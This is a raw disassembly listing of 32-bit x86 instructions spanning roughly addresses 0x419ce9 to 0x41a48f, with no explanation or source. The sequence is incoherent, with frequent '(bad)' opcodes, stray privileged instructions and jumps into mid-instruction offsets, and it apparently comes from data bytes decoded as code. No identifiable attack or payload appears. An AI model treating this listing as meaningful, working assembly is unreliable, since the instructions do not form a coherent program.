  419ce9:	(bad)  
  419cea:	push   edx
  419cec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ced:	cmp    bh,0xec
  419cf0:	xor    DWORD PTR [ecx-0xff9000],ecx
  419cf6:	dec    esi
  419cf7:	hlt    
  419cf8:	int3   
  419cf9:	mov    DWORD PTR [ebx-0x6a1371],eax
  419cff:	icebp  
  419d00:	retf   
  419d01:	add    BYTE PTR [ebx+0x73ff00fb],al
  419d07:	mov    eax,0xc78300ff
  419d0c:	repnz fld QWORD PTR [eax]
  419d0f:	and    al,BYTE PTR [esi]
  419d11:	add    BYTE PTR [ecx+0xf0000d6],cl
  419d17:	nop
  419d18:	(bad)  
  419d19:	(bad)  
  419d1a:	jmp    FWORD PTR [eax]
  419d1c:	ins    DWORD PTR es:[edi],dx
  419d1d:	ins    BYTE PTR es:[edi],dx
  419d1e:	push   DWORD PTR [ebx-0x5d]
  419d21:	(bad)  
  419d22:	inc    DWORD PTR [esi-0x50040100]
  419d28:	add    bh,bh
  419d2a:	call   FWORD PTR [esi+0x3f]
  419d2d:	mov    edx,0xff3befff
  419d32:	sub    DWORD PTR [ebp-0x5d787c01],0x0
  419d39:	inc    DWORD PTR [eax]
  419d3b:	jne    0x419d94
  419d3d:	or     bh,bh
  419d3f:	and    al,0x3
  419d41:	int3   
  419d42:	(bad)  
  419d43:	in     eax,dx
  419d44:	add    bh,bh
  419d46:	icebp  
  419d47:	xor    bh,bh
  419d49:	add    ah,cl
  419d4b:	xor    cl,dl
  419d4d:	clc    
  419d4e:	dec    DWORD PTR [esi]
  419d50:	sbb    al,BYTE PTR [eax]
  419d52:	jmp    DWORD PTR [edi-0x1]
  419d55:	add    BYTE PTR [esi],al
  419d57:	(bad)  
  419d59:	(bad)  
  419d5a:	call   FWORD PTR [eax+0x44]
  419d5d:	arpl   di,di
  419d5f:	dec    edi
  419d60:	sub    al,0x0
  419d62:	inc    DWORD PTR [edi]
  419d64:	add    BYTE PTR [ebx-0xff67a8],al
  419d6a:	add    BYTE PTR [edx+ebp*8-0x27],cl
  419d6e:	add    BYTE PTR [edi+0x76],bh
  419d71:	add    DWORD PTR [eax],0x72
  419d74:	inc    DWORD PTR [ebx-0x76ff9282]
  419d7a:	add    BYTE PTR [ebx-0x70],bh
  419d7d:	or     ecx,DWORD PTR [ecx-0x7600e8cc]
  419d83:	or     DWORD PTR [eax],eax
  419d85:	call   FWORD PTR [ebp-0x34]
  419d88:	inc    DWORD PTR [eax]
  419d8a:	add    BYTE PTR [edx-0x46ff3dc9],al
  419d90:	xor    al,0x0
  419d92:	adc    DWORD PTR [edi+edi*8-0x8d1600],0x0
  419d9a:	add    BYTE PTR [ecx+0xffdbf2],ch
  419da0:	outs   dx,DWORD PTR ds:[esi]
  419da1:	(bad)  
  419da2:	jmp    FWORD PTR [ebp+0x0]
  419da5:	jmp    DWORD PTR [edi]
  419da7:	pop    edi
  419da8:	cmp    edi,0x0
  419dab:	add    eax,0xf900feb3
  419db0:	(bad)  
  419db1:	int3   
  419db2:	add    BYTE PTR [edi],ah
  419db4:	cmp    edi,0xfffffff5
  419db7:	stos   BYTE PTR es:[edi],al
  419db8:	add    BYTE PTR [eax],al
  419dba:	call   FWORD PTR [ebx+0x5b]
  419dbd:	int3   
  419dbe:	dec    edi
  419dc0:	cdq    
  419dc1:	mov    edi,edi
  419dc3:	rol    DWORD PTR [eax],0xcc
  419dc6:	push   ds
  419dc7:	cwde   
  419dc8:	add    bh,bh
  419dca:	push   DWORD PTR [edi-0x3b7ceea2]
  419dd0:	std    
  419dd1:	cmp    edi,0x2c
  419dd4:	add    ah,cl
  419dd6:	sti    
  419dd7:	sbb    BYTE PTR [ebx-0x65ce0077],al
  419ddd:	test   BYTE PTR [eax],0x7e
  419de0:	push   ebx
  419de1:	add    bh,bh
  419de3:	das    
  419de4:	(bad)  
  419de5:	call   DWORD PTR [eax-0x64]
  419de8:	cmp    edi,0xffffffff
  419deb:	sub    ah,bh
  419ded:	sar    bh,0x8d
  419df0:	sahf   
  419df1:	add    DWORD PTR [ebx+0x38fffff0],0x10
  419df8:	cmp    edi,0xffffffff
  419dfb:	rcl    DWORD PTR [eax+ebx*8-0x1],cl
  419dff:	inc    ebp
  419e00:	pop    ecx
  419e01:	add    bh,bh
  419e03:	push   eax
  419e04:	add    BYTE PTR [ebx+0xff623f],al
  419e0a:	add    BYTE PTR [eax+0x52ff5d5e],dh
  419e10:	loop   0x419e11
  419e12:	int3   
  419e13:	pop    edx
  419e14:	add    DWORD PTR [ebx+0xabe0],0x0
  419e1b:	sbb    BYTE PTR [ebx+edi*1-0x1],ch
  419e1f:	cli    
  419e20:	rol    DWORD PTR [eax],1
  419e22:	(bad)  
  419e23:	(bad)  [ecx-0x33d9fc00]
  419e29:	cmp    edi,0xfffffff1
  419e2c:	dec    ecx
  419e2d:	mov    eax,ds:0x10d7ff
  419e32:	add    BYTE PTR [edi+edi*8],bl
  419e35:	(bad)  
  419e36:	jg     0x419e73
  419e38:	add    BYTE PTR [eax],al
  419e3a:	inc    DWORD PTR [eax]
  419e3c:	sub    ebx,ecx
  419e3e:	and    DWORD PTR [ebx+ecx*4+0xb6ff00],0xffffffff
  419e46:	int3   
  419e47:	jle    0x419dcc
  419e49:	add    BYTE PTR [eax],al
  419e4b:	inc    edx
  419e4c:	fs call 0xe700:0xffd93700
  419e54:	mov    esp,ecx
  419e56:	ins    WORD PTR es:[edi],dx
  419e58:	(bad)  
  419e59:	(bad)  
  419e5a:	jmp    DWORD PTR [eax+0x7eff2c71]
  419e60:	adc    al,BYTE PTR [ebx-0x7cfa01]
  419e66:	test   al,0xc
  419e68:	(bad)  
  419e69:	(bad)  
  419e6a:	dec    DWORD PTR [edi+eiz*8-0x19]
  419e6e:	add    BYTE PTR [ebp-0x2600ffb9],bl
  419e74:	inc    DWORD PTR [eax]
  419e76:	dec    edi
  419e77:	sub    eax,DWORD PTR [ebx+0x126ccff]
  419e7d:	or     al,0xff
  419e7f:	xor    eax,0xfe000003
  419e84:	inc    DWORD PTR [ebx-0x84f7]
  419e8a:	mov    edi,ebx
  419e8c:	mov    dh,0x98
  419e8e:	dec    DWORD PTR [esp+edx*8-0x1]
  419e92:	or     esi,0xffffffff
  419e95:	jmp    FWORD PTR [ecx+ebx*2-0x7d]
  419e99:	mov    DWORD PTR [eax],eax
  419e9b:	pop    ebp
  419e9c:	or     ah,BYTE PTR [ebx-0xe44c34]
  419ea2:	add    BYTE PTR [esi+0x5a2b89ff],cl
  419ea8:	(bad)  
  419ea9:	(bad)  
  419eaa:	call   DWORD PTR [esi+0x51]
  419ead:	pop    ebp
  419eae:	call   FWORD PTR [ecx+0x2b]
  419eb1:	inc    DWORD PTR [eax]
  419eb3:	mov    bh,bh
  419eb5:	int3   
  419eb6:	inc    esi
  419eb7:	pop    ebp
  419eb8:	inc    DWORD PTR [ebx-0x20d7cc01]
  419ebe:	or     DWORD PTR [edx+0x3c00ffdd],0xffffff89
  419ec5:	add    BYTE PTR [edx-0x2a],bh
  419ec8:	(bad)  
  419ec9:	(bad)  
  419eca:	(bad)  
  419ecb:	fisttp WORD PTR [ebx]
  419ecd:	lods   eax,DWORD PTR ds:[esi]
  419ece:	add    BYTE PTR [eax],bh
  419ed0:	imul   eax,DWORD PTR [eax],0xcc49ff
  419ed6:	ins    BYTE PTR es:[edi],dx
  419ed7:	inc    esi
  419ed8:	add    BYTE PTR [ebx-0x6144c01],al
  419ede:	add    bh,ah
  419ee0:	(bad)  
  419ee1:	(bad)  
  419ee2:	(bad)  
  419ee3:	fdiv   st(7),st
  419ee5:	mov    DWORD PTR [edx],ecx
  419ee7:	cli    
  419ee8:	add    ah,cl
  419eea:	adc    DWORD PTR [ecx+0x38],0xffffff87
  419eee:	add    ah,dl
  419ef0:	cwde   
  419ef1:	(bad)  
  419ef2:	jmp    FWORD PTR [ecx]
  419ef4:	(bad)  
  419ef5:	jmp    DWORD PTR [ebx+0x2f]
  419ef8:	cmp    edi,0xffffffff
  419efb:	pop    ecx
  419efc:	pop    DWORD PTR ds:0xfaa700
  419f02:	call   esp
  419f04:	add    DWORD PTR [ebx-0x2f3a],0xffffffff
  419f0b:	fs cmp al,0x68
  419f0e:	jmp    DWORD PTR [edx]
  419f10:	inc    ecx
  419f11:	dec    esp
  419f13:	leave  
  419f14:	add    ah,cl
  419f16:	shr    BYTE PTR [esi+0x4e000000],0xc7
  419f1d:	les    eax,FWORD PTR [eax]
  419f1f:	icebp  
  419f20:	mov    DWORD PTR ds:[eax],eax
  419f23:	add    eax,DWORD PTR [eax]
  419f25:	add    BYTE PTR [ebp-0xffff93],cl
  419f2b:	retf   
  419f2c:	test   BYTE PTR [edi+0x76dc00],0xff
  419f33:	cli    
  419f34:	mov    edi,edi
  419f36:	stos   BYTE PTR es:[edi],al
  419f37:	cmp    edi,0x0
  419f3a:	add    BYTE PTR [ecx],dl
  419f3c:	les    eax,FWORD PTR [ecx+0xa6f3ff]
  419f42:	push   DWORD PTR [esi-0x1]
  419f45:	int3   
  419f46:	jp     0x419f6f
  419f48:	add    bh,bh
  419f4a:	add    esp,0x49
  419f4d:	xlat   BYTE PTR ds:[ebx]
  419f4e:	add    BYTE PTR [esi-0x42ff0024],ah
  419f54:	dec    esp
  419f56:	lods   al,BYTE PTR ds:[esi]
  419f57:	jle    0x419edc
  419f59:	(bad)  
  419f5a:	(bad)  
  419f5b:	cmp    bh,BYTE PTR [ebp+0x71]
  419f5e:	jmp    DWORD PTR [eax]
  419f60:	cld    
  419f61:	inc    DWORD PTR [eax]
  419f63:	(bad)  
  419f66:	sub    bl,BYTE PTR [edi]
  419f68:	add    DWORD PTR [eax],0xffffffff
  419f6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f6c:	push   edi
  419f6d:	dec    ebp
  419f6e:	inc    esi
  419f70:	inc    ebp
  419f71:	dec    esp
  419f73:	inc    eax
  419f74:	(bad)  
  419f75:	dec    DWORD PTR [ebx]
  419f77:	sub    eax,DWORD PTR [eax]
  419f79:	add    bh,bh
  419f7b:	mov    bl,0xbb
  419f7d:	pop    ecx
  419f7e:	call   ecx
  419f80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f81:	add    bh,bh
  419f83:	repz add DWORD PTR [ebx-0x3762],0xffffffff
  419f8b:	inc    DWORD PTR [eax]
  419f8d:	add    BYTE PTR [eax],al
  419f8f:	push   DWORD PTR [edx+0x5e49ffff]
  419f95:	fild   DWORD PTR [eax]
  419f97:	or     DWORD PTR [eax+eax*1],ebx
  419f9a:	add    BYTE PTR [ebx-0x10333201],al
  419fa0:	retf   0xccff
  419fa3:	jo     0x419f3e
  419fa5:	pusha  
  419fa6:	add    BYTE PTR [ecx+0x5a],ch
  419fac:	add    BYTE PTR [edi+edi*8+0xffea98],ah
  419fb3:	push   ds
  419fb4:	out    0x51,eax
  419fb6:	add    cl,dh
  419fb8:	int3   
  419fb9:	int3   
  419fba:	(bad)  
  419fbb:	(bad)  
  419fbc:	dec    DWORD PTR [ecx-0xa43901]
  419fc2:	add    cl,cl
  419fc4:	out    dx,eax
  419fc5:	adc    al,0x83
  419fc7:	jne    0x419f9f
  419fc9:	mov    DWORD PTR [eax],eax
  419fcb:	add    bh,bh
  419fcd:	cmp    eax,0x20fa00
  419fd2:	add    BYTE PTR [edx-0x6c],dl
  419fd5:	iret   
  419fd6:	int3   
  419fd7:	(bad)  
  419fd9:	add    BYTE PTR [ecx-0xc40000],cl
  419fdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fe0:	fwait
  419fe1:	mov    edi,edi
  419fe3:	xor    al,0x46
  419fe5:	or     esp,0x83ff3e3e
  419feb:	add    DWORD PTR [eax],0xffffffa6
  419fee:	call   ebx
  419ff0:	pop    esp
  419ff1:	(bad)  
  419ff2:	(bad)  
  419ff3:	std    
  419ff4:	out    0x56,eax
  419ff6:	sbb    edx,0xffffffb0
  419ff9:	mov    esp,ecx
  419ffb:	inc    DWORD PTR [eax]
  419ffd:	jmp    0x89c78a02
  41a002:	inc    DWORD PTR [edx+0x46835546]
  41a008:	jno    0x419fd6
  41a00a:	add    ah,cl
  41a00c:	jmp    DWORD PTR [ebx]
  41a00e:	int3   
  41a00f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a010:	adc    eax,0xe378ffff
  41a015:	clc    
  41a016:	add    ah,al
  41a018:	ds add bh,bh
  41a01b:	(bad)  
  41a01c:	push   DWORD PTR [ebx-0x1d1900]
  41a022:	add    BYTE PTR [ebx],ah
  41a024:	mov    esi,0x4fddffb4
  41a029:	(bad)  
  41a02a:	(bad)  
  41a02b:	inc    DWORD PTR [ebx-0x5090028]
  41a031:	add    BYTE PTR [eax],al
  41a033:	add    eax,0x1200a3d4
  41a038:	mov    bh,0xcc
  41a03a:	(bad)  
  41a03b:	(bad)  
  41a03c:	call   DWORD PTR [eax-0x7d2c01]
  41a042:	add    BYTE PTR [edx],ch
  41a044:	xchg   edi,eax
  41a045:	or     bh,bh
  41a047:	and    ch,ch
  41a049:	add    bh,bh
  41a04b:	inc    DWORD PTR [eax]
  41a04d:	pop    edi
  41a04e:	add    BYTE PTR [eax-0x7800fff1],dh
  41a054:	or     DWORD PTR ds:0x89dfd400,edi
  41a05a:	mov    edi,edi
  41a05c:	push   DWORD PTR [ebx-0x1]
  41a05f:	add    BYTE PTR [ebx],al
  41a061:	inc    DWORD PTR [eax]
  41a063:	jge    0x41a0da
  41a065:	lods   eax,DWORD PTR ds:[esi]
  41a066:	mov    DWORD PTR [esi-0x7cff76f5],ebp
  41a06c:	add    dh,dh
  41a06e:	mov    edx,ebx
  41a070:	or     al,0xff
  41a072:	int3   
  41a073:	in     eax,dx
  41a074:	gs push edi
  41a076:	push   DWORD PTR [ebx-0x74]
  41a07c:	jmp    DWORD PTR [ebx-0x76713300]
  41a082:	call   FWORD PTR [eax+0x1d]
  41a085:	scas   al,BYTE PTR es:[edi]
  41a086:	add    BYTE PTR [edi],bh
  41a088:	jge    0x41a089
  41a08a:	mov    edi,edi
  41a08c:	int3   
  41a08d:	iret   
  41a08e:	call   ebp
  41a090:	push   edi
  41a091:	(bad)  
  41a092:	inc    edi
  41a094:	inc    edx
  41a095:	dec    edx
  41a096:	and    ebp,0x6f
  41a099:	inc    DWORD PTR [eax]
  41a09b:	add    bh,bh
  41a09d:	in     al,0x0
  41a09f:	sub    edx,DWORD PTR [edi-0x7d]
  41a0a2:	sbb    eax,0x18
  41a0a5:	popa   
  41a0a6:	inc    edx
  41a0a8:	rol    DWORD PTR [ebx+0x24ffff00],1
  41a0ae:	dec    DWORD PTR [esi+0x7b]
  41a0b1:	add    DWORD PTR [eax],0xffffffbc
  41a0b4:	jae    0x41a0b7
  41a0b6:	add    BYTE PTR [ebx+0x78],dh
  41a0b9:	add    DWORD PTR [eax],0xffffffff
  41a0bc:	int3   
  41a0bd:	add    DWORD PTR [ebx+0x831891],0x838df7af
  41a0c7:	pop    edx
  41a0c8:	xchg   edx,eax
  41a0c9:	add    bh,bh
  41a0cb:	int3   
  41a0cc:	push   eax
  41a0ce:	inc    DWORD PTR [ecx-0x6800005c]
  41a0d4:	and    bh,BYTE PTR [ebx-0x7d]
  41a0d7:	rcr    BYTE PTR [esi],1
  41a0d9:	add    bh,bh
  41a0db:	(bad)  
  41a0dc:	jmp    FWORD PTR [eax-0x76e68601]
  41a0e2:	(bad)  
  41a0e3:	jl     0x41a0a6
  41a0e5:	add    BYTE PTR [eax],al
  41a0e7:	test   BYTE PTR [edx-0x7600ff7d],dl
  41a0ed:	mov    eax,ds:0xcc0f3900
  41a0f2:	cmp    DWORD PTR [ebp-0x61],0x65
  41a0f6:	dec    DWORD PTR [edx]
  41a0f8:	loope  0x41a083
  41a0fa:	(bad)  
  41a0fb:	inc    DWORD PTR [ebx+0x7cd100a4]
  41a101:	mov    edi,edi
  41a103:	dec    esi
  41a104:	data16 aam 0xff
  41a107:	int    0xba
  41a109:	inc    DWORD PTR [ebx-0x7c4e3301]
  41a10f:	sub    edx,DWORD PTR [esi-0x548aff01]
  41a115:	lahf   
  41a116:	mov    ebx,ebx
  41a118:	inc    ebx
  41a119:	(bad)  
  41a11a:	inc    DWORD PTR [eax]
  41a11c:	add    BYTE PTR [ebp-0x1],bh
  41a11f:	in     al,0xa0
  41a121:	(bad)  
  41a122:	inc    DWORD PTR [edi]
  41a124:	jns    0x41a188
  41a126:	adc    DWORD PTR [esi],0xffffffec
  41a129:	int3   
  41a12a:	dec    esp
  41a12c:	and    ebx,0xffffff83
  41a12f:	iret   
  41a130:	es or  esp,0x56
  41a134:	sahf   
  41a135:	jbe    0x41a137
  41a137:	and    ecx,esi
  41a139:	add    bh,bh
  41a13b:	(bad)  
  41a13c:	(bad)  
  41a13d:	std    
  41a13e:	add    BYTE PTR [ebx-0x5f],cl
  41a141:	(bad)  
  41a142:	(bad)  
  41a143:	mov    eax,0xea00bae3
  41a148:	push   edi
  41a149:	dec    esp
  41a14b:	add    BYTE PTR [eax],al
  41a14d:	fdivr  st,st(7)
  41a14f:	mov    ah,0xa0
  41a151:	(bad)  
  41a152:	call   DWORD PTR [esi+0x33]
  41a155:	sar    bh,cl
  41a157:	rcl    ah,cl
  41a159:	(bad)  
  41a15a:	(bad)  
  41a15b:	inc    DWORD PTR [eax]
  41a15d:	cmp    bh,0x93
  41a160:	xchg   ecx,eax
  41a161:	dec    esp
  41a163:	adc    eax,DWORD PTR [esi-0x61]
  41a166:	mov    DWORD PTR [ebx+0x72],esp
  41a169:	(bad)  
  41a16a:	(bad)  
  41a16b:	inc    DWORD PTR [eax]
  41a16d:	push   edi
  41a16e:	dec    eax
  41a170:	fdiv   st(7),st
  41a172:	mov    DWORD PTR [eax+0x55],ebp
  41a175:	rol    DWORD PTR [eax],cl
  41a177:	pop    ebx
  41a178:	mov    ebp,0xccff83ff
  41a17d:	retf   
  41a17e:	call   DWORD PTR ds:0xdd00ff4d
  41a184:	enter  0xcc45,0xb2
  41a188:	mov    BYTE PTR [eax],0x0
  41a18b:	(bad)  
  41a18c:	call   DWORD PTR [esi]
  41a18e:	add    cl,dl
  41a190:	and    eax,DWORD PTR [eax]
  41a192:	mov    DWORD PTR [ebx+0x2f],esp
  41a195:	test   eax,0xfffb6eff
  41a19a:	int3   
  41a19b:	dec    esp
  41a19d:	test   DWORD PTR [ebx+0xff620b],0xd54dc2
  41a1a7:	nop
  41a1a8:	into   
  41a1a9:	or     esp,0xffffff83
  41a1ac:	mov    DWORD PTR [edi+0x74f200],eax
  41a1b2:	add    BYTE PTR [ebx+0x7],cl
  41a1b5:	push   ds
  41a1b6:	jmp    FWORD PTR [edi+0x44]
  41a1b9:	add    BYTE PTR [ebx+0x62ffff],al
  41a1bf:	outs   dx,BYTE PTR ds:[esi]
  41a1c0:	pop    ds
  41a1c1:	cmp    edi,0xffffffd4
  41a1c4:	fld    TBYTE PTR [esi-0x7c21df77]
  41a1ca:	inc    DWORD PTR [ebx+0x29000c83]
  41a1d0:	inc    edx
  41a1d1:	add    DWORD PTR [ebx-0x7670b6ec],0xffffffab
  41a1d8:	cli    
  41a1d9:	(bad)  
  41a1da:	inc    DWORD PTR [ebx+0x4700b300]
  41a1e0:	daa    
  41a1e1:	or     esp,0xffffffab
  41a1e4:	cmp    edi,DWORD PTR [eax+0x1bbff]
  41a1ea:	inc    DWORD PTR [eax]
  41a1ec:	int3   
  41a1ed:	ins    DWORD PTR es:[edi],dx
  41a1ee:	push   DWORD PTR [eax]
  41a1f0:	loope  0x41a1be
  41a1f2:	int3   
  41a1f3:	cdq    
  41a1f4:	xchg   edi,eax
  41a1f5:	cld    
  41a1f6:	call   DWORD PTR [ebx+0xcccca0]
  41a1fc:	dec    DWORD PTR [edi+0x3464ff]
  41a202:	inc    ecx
  41a204:	outs   dx,DWORD PTR ds:[esi]
  41a205:	in     al,dx
  41a206:	int3   
  41a207:	imul   ecx,DWORD PTR [esi],0x0
  41a20a:	cmp    edi,0xffffff83
  41a20d:	fadd   QWORD PTR [ebx-0xffe3ae]
  41a213:	jp     0x41a229
  41a215:	or     BYTE PTR [eax],al
  41a217:	or     eax,DWORD PTR [ebp-0xff3400]
  41a21d:	and    DWORD PTR [ebx+0x8961b3],eax
  41a223:	test   eax,0xd600f03e
  41a228:	jo     0x41a1f6
  41a22a:	(bad)  
  41a22b:	inc    DWORD PTR [eax]
  41a22d:	sub    bh,bh
  41a22f:	ja     0x41a1bd
  41a231:	inc    DWORD PTR [ebx-0x208301]
  41a237:	test   BYTE PTR [ebx],ah
  41a239:	dec    DWORD PTR [ecx-0x770100]
  41a23f:	pop    ebx
  41a240:	pop    edi
  41a241:	inc    DWORD PTR [eax]
  41a243:	mov    eax,ds:0x19ff39c1
  41a248:	in     eax,dx
  41a249:	cmp    edi,0xffffff89
  41a24c:	or     edi,0xffffffcc
  41a24f:	adc    cl,BYTE PTR [edx]
  41a251:	mov    edi,edi
  41a253:	jmp    0x3240f224
  41a258:	(bad)  
  41a259:	(bad)  
  41a25a:	(bad)  
  41a25b:	(bad)  
  41a25c:	(bad)  
  41a25d:	mov    esi,0x89257aff
  41a262:	call   edi
  41a264:	ss stc 
  41a266:	add    bl,bh
  41a268:	sub    edi,edi
  41a26a:	add    BYTE PTR [ebx-0x507c0f00],al
  41a270:	js     0x41a272
  41a272:	int3   
  41a273:	sbb    ebp,eax
  41a275:	in     al,dx
  41a276:	jmp    DWORD PTR [ecx-0xffe0]
  41a27c:	mov    DWORD PTR [esi-0xcf9b01],edi
  41a282:	push   esp
  41a284:	cmc    
  41a285:	cmp    bh,0x2f
  41a288:	outs   dx,BYTE PTR ds:[esi]
  41a289:	add    bh,bh
  41a28b:	(bad)  
  41a28c:	dec    DWORD PTR [esi]
  41a28e:	int3   
  41a28f:	imul   esp,DWORD PTR [edi+edi*8+0x55b3caff],0xffffffff
  41a297:	lea    edi,[ecx-0x34]
  41a29a:	(bad)  
  41a29b:	dec    esp
  41a29d:	inc    ebx
  41a29e:	add    al,ch
  41a2a0:	mov    bl,0x83
  41a2a2:	add    ch,bh
  41a2a4:	inc    ebx
  41a2a5:	fs int3 
  41a2a7:	adc    eax,0xff00ff81
  41a2ac:	xor    DWORD PTR [ecx+ecx*4+0xff52ef],0xffffffdd
  41a2b4:	(bad)  
  41a2b5:	idiv   edi
  41a2b7:	sti    
  41a2b8:	add    eax,0x89ff0083
  41a2bd:	dec    ecx
  41a2be:	add    BYTE PTR [ebx+ebx*2],al
  41a2c1:	add    BYTE PTR [ecx+0x6b0de0],cl
  41a2c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2c8:	or     cl,ah
  41a2ca:	add    BYTE PTR [eax],al
  41a2cc:	sbb    DWORD PTR [edx-0x7cf06f01],0x0
  41a2d3:	xor    BYTE PTR [ecx-0x5d],bh
  41a2d6:	cmp    DWORD PTR [edx-0x337600f6],0x0
  41a2dd:	mov    dh,0xff
  41a2df:	imul   ebp,DWORD PTR [ecx],0xffffffff
  41a2e2:	push   DWORD PTR [edx]
  41a2e4:	cmc    
  41a2e5:	pop    esi
  41a2e6:	call   DWORD PTR [ebx-0x31]
  41a2e9:	mov    DWORD PTR [ebx+0x898389],eax
  41a2ef:	aad    0x33
  41a2f1:	mov    DWORD PTR [eax],eax
  41a2f3:	es icebp 
  41a2f5:	sub    bh,bh
  41a2f7:	push   ebp
  41a2f8:	ret    0xccff
  41a2fb:	add    BYTE PTR [eax],al
  41a2fd:	jns    0x41a2fe
  41a2ff:	loop   0x41a356
  41a301:	int3   
  41a302:	add    dh,bl
  41a304:	out    0xc6,al
  41a306:	int3   
  41a307:	mov    ecx,0xffccff3f
  41a30c:	push   DWORD PTR [esi]
  41a30e:	add    BYTE PTR [edi+ebp*2],ch
  41a311:	inc    DWORD PTR [eax]
  41a313:	jge    0x41a2eb
  41a315:	outs   dx,BYTE PTR ds:[esi]
  41a316:	dec    DWORD PTR [ebx+esi*8]
  41a319:	add    BYTE PTR [eax],al
  41a31b:	inc    DWORD PTR [eax]
  41a31d:	jecxz  0x41a31e
  41a31f:	sbb    ah,dh
  41a321:	mov    edi,edi
  41a323:	push   ebx
  41a324:	ret    
  41a325:	adc    al,0x0
  41a327:	adc    eax,0xff00ffec
  41a32c:	(bad)  
  41a32d:	dec    esp
  41a32f:	mov    ecx,0xadffccd3
  41a334:	mov    ecx,0x7c07ffaa
  41a339:	mov    DWORD PTR [eax],eax
  41a33b:	add    BYTE PTR [ebx+0x36feffd1],al
  41a341:	inc    DWORD PTR [eax]
  41a343:	mov    ecx,0xe4ffaa3a
  41a348:	add    edi,edi
  41a34a:	inc    DWORD PTR [eax]
  41a34c:	int3   
  41a34d:	mov    bl,0x0
  41a34f:	fistp  DWORD PTR [ecx-0x1]
  41a352:	inc    DWORD PTR [ebx+0x7e833d3c]
  41a358:	mov    ah,0xff
  41a35a:	add    BYTE PTR [eax],al
  41a35c:	add    al,bh
  41a35e:	add    DWORD PTR [edi],0x45
  41a361:	inc    DWORD PTR [ebx+0x4ecaa9]
  41a367:	dec    ebx
  41a368:	dec    ebp
  41a369:	(bad)  
  41a36a:	(bad)  
  41a36b:	(bad)  
  41a36c:	(bad)  
  41a36d:	in     eax,dx
  41a36e:	sbb    DWORD PTR [ebx+0x63],0x0
  41a372:	call   DWORD PTR [ebx-0x600066bf]
  41a378:	push   ebp
  41a379:	add    ah,cl
  41a37b:	add    bh,bh
  41a37d:	ret    
  41a37e:	int3   
  41a37f:	fld    st(4)
  41a381:	add    bh,bh
  41a383:	cmp    cl,dh
  41a385:	jge    0x41a386
  41a387:	test   DWORD PTR [eax],edi
  41a389:	add    ah,cl
  41a38b:	add    bh,bh
  41a38d:	mov    al,0x0
  41a38f:	mov    dl,0xf4
  41a391:	add    BYTE PTR [eax],al
  41a393:	cmp    eax,0x49ff4452
  41a398:	aad    0xff
  41a39a:	add    bh,bh
  41a39c:	int3   
  41a39d:	xchg   ebp,eax
  41a39e:	call   FWORD PTR [eax]
  41a3a0:	rol    DWORD PTR [eax],1
  41a3a2:	add    cl,bh
  41a3a4:	jmp    0x6b07a30c
  41a3a9:	(bad)  
  41a3aa:	dec    esp
  41a3ac:	or     DWORD PTR [eax-0x1],0x13
  41a3b0:	jns    0x41a3b2
  41a3b2:	mov    DWORD PTR [ecx-0x29],ecx
  41a3b5:	sub    DWORD PTR [eax],eax
  41a3b7:	add    bl,bl
  41a3b9:	(bad)  
  41a3ba:	(bad)  
  41a3bb:	(bad)  
  41a3bc:	jmp    FWORD PTR [ecx-0x1]
  41a3bf:	push   ebp
  41a3c0:	fwait
  41a3c1:	mov    DWORD PTR [ecx+0xb1bf4c],ecx
  41a3c7:	imul   ebp,eax,0x89ff00ff
  41a3cd:	fwait
  41a3ce:	push   ebp
  41a3d0:	xchg   edx,eax
  41a3d1:	add    BYTE PTR [ecx-0x7c22e9c0],cl
  41a3d7:	inc    edi
  41a3d8:	jb     0x41a3a6
  41a3da:	mov    edi,edi
  41a3dc:	call   DWORD PTR [edi+0x0]
  41a3df:	inc    ebp
  41a3e0:	test   eax,0x600483ff
  41a3e5:	xchg   esi,eax
  41a3e6:	int3   
  41a3e7:	or     ebp,DWORD PTR [ecx]
  41a3e9:	add    bh,bh
  41a3eb:	add    DWORD PTR [eax],0x3b
  41a3ee:	or     edi,0xffffff96
  41a3f1:	(bad)  
  41a3f2:	jmp    FWORD PTR [ecx-0x4e]
  41a3f5:	pop    ds
  41a3f6:	add    BYTE PTR [edx+eiz*4-0x7c0001],bh
  41a3fd:	test   BYTE PTR [eax],al
  41a3ff:	lea    edi,[edx]
  41a401:	add    bh,bh
  41a403:	xor    eax,0x90009517
  41a408:	loop   0x41a40a
  41a40a:	cmp    edi,0xffffffff
  41a40d:	das    
  41a40e:	add    BYTE PTR ds:0xf0ff892f,bh
  41a414:	xchg   edi,eax
  41a415:	xchg   esi,eax
  41a416:	add    bh,dh
  41a418:	mov    al,0xff
  41a41a:	int3   
  41a41b:	add    DWORD PTR [ebx+0x19b4ccb4],0xffffffff
  41a422:	call   FWORD PTR [ecx+0xbffc673]
  41a428:	mov    ch,0x0
  41a42a:	mov    DWORD PTR [eax],eax
  41a42c:	push   eax
  41a42e:	add    BYTE PTR [eax+0x3bff0006],dl
  41a434:	dec    esp
  41a435:	and    al,0xff
  41a437:	out    0x7c,eax
  41a439:	dec    esp
  41a43b:	add    DWORD PTR [eax],0xffffffe8
  41a43e:	add    BYTE PTR [esi-0x2cff3309],ch
  41a444:	dec    ebp
  41a445:	repnz add BYTE PTR [esp+edx*2],cl
  41a449:	int3   
  41a44a:	(bad)  
  41a44b:	inc    DWORD PTR [eax]
  41a44d:	inc    edx
  41a44e:	add    BYTE PTR [esi+0x52cc8384],ch
  41a454:	jno    0x41a48a
  41a456:	push   edx
  41a458:	and    eax,0x83ffff
  41a45d:	dec    ecx
  41a45e:	sub    DWORD PTR [ebx],0xa
  41a461:	int3   
  41a462:	push   ecx
  41a464:	lods   al,BYTE PTR ds:[esi]
  41a465:	dec    ebp
  41a466:	add    BYTE PTR [ecx+0xff83e6],cl
  41a46c:	and    edx,0xffffffff
  41a46f:	push   es
  41a470:	inc    DWORD PTR [bx+si]
  41a473:	fadd   st,st(1)
  41a475:	adc    al,BYTE PTR [eax]
  41a477:	cmp    BYTE PTR [ebx+eax*4],ah
  41a47a:	(bad)  
  41a47b:	dec    esp
  41a47d:	xchg   esi,eax
  41a47e:	add    BYTE PTR [ebx+edx*8-0x1],bl
  41a482:	(bad)  
  41a483:	out    dx,eax
  41a484:	fstp   st(3)
  41a486:	add    DWORD PTR [ebp+eiz*4+0x89],0x35
  41a48e:	(bad)  
  41a48f:	cld    
